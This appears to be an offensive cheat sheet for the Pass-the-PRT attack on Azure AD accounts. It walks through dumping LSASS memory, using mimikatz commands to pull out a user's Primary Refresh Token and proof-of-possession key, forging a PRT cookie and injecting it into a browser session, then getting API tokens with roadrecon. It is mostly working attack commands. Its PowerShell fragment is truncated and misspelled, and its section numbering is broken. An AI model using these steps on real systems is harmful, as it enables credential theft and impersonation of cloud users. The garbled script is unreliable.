# Pass-the-PRT

Original Research: https://cqureacademy.com/hacks/pass-the-prt-attack/

## Requirements:

Admin/SYSTEM access to a machine.

### 1) Dump LSASS process

You can do it with any method you desire. In this example, we will dump it via Task Manager.

    CTRL+SHIFT+ESC -> Processes -> Right-click lsass.exe -> Create Memory Dump

### 2) Load memory dump file

    sekurlsa::minidump lsass.dmp

### 3) Dump Cloud Authentication Package data

    sekurlsa::cloudap

### 4) Copy PRT of a target user account to Visual Studio Code for further readability.

Interesting parts:

1) The token itself

2) Proof of Possession Key

### 5) Generate PRT cookie

    dpapi::cloudapkd /keyvalue:PROOF_OF_POSSESSION_KEY /unprotect

If the Proof of Possession Key is encrypted using DPAPI, retrieve the corresponding masterkey.

    sekurlsa::dpapi
    dpapi::cache

If the key is encrypted using the TPM chip of the computer, elevate permissions to the SYSTEM account, then try to retrieve key again.

    privilege::debug
    token::elevate

Use the Primary Refresh Token together with the Proof of Possession Key to digitally sign a new PRT.

    dpapi::cloudapkd /prt:PRT_TOKEN /derivedkey:DERIVED_KEY 

## Alternate Method: Browser Core

### 1) Request.ps1 

    function Main
    {
        $request = '
        {
            "method":"GetCookies",
            "uri":"https://login.microsoftonline.com/common/oauth2/authorize",
            "sender":"https://login.microsoftonline.com"
        }'

        $broker = "$env:ProgramFiles\Windows Security\BrowserCore\brosercore.exe"

        $response = Invoke-Broker -BrokerPath $broker -Request $request

        $response

### 1) 

### 6) Use the PRT cookie

Access the Azure Portal (example)

Go to Developer's tools

    F12

Configure a new cookie called 

    x-ms-RefreshTokenCredential

with the cookie value.

Refresh, and VOILA!

## Alternate Usage of PRT Method: Roadrecon

### 1) Get a graph API access token

    roadrecon auth --prt-cookie PRT_COOKIE
    cat .roadtools_auth | python3 -m json.tool

### 2) Connect to Azure

    Connect-AzureAD -TenantId TENANT_ID -AccountId OID -AadAccessToken ACCESS_TOKEN
